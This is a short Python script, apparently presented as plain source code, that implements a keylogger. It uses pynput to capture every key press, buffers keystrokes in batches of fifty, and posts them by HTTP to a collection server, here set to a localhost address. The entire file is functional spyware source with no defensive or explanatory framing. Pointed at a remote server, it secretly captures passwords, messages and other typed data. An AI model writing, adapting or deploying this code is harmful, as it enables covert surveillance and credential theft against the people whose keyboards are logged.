import requests
from pynput import  keyboard
from pynput.keyboard import Key, Listener

SERVER_URL = "http://localhost:5000/logs"
LOG_BUFFER = []
BUFFER_SIZE = 50

def on_press(key):
    try:
        log_data = str(key.char)
    except AttributeError:
        log_data = str(key)

    LOG_BUFFER.append(log_data)

    if len(LOG_BUFFER) >= BUFFER_SIZE:
        send_logs_to_server()

def send_logs_to_server():
    try:
        response = requests.post(SERVER_URL, data={"logs": ''.join(LOG_BUFFER)})
        print(f"Server response: {response.status_code}")
        if response.status_code == 200:
            LOG_BUFFER.clear() 
    except requests.exceptions.RequestException as e:
        print(f"Failed to send logs: {e}")

    # requests.post(SERVER_URL, data={"log": log_data})

with Listener(on_press=on_press) as listener:
    listener.join()
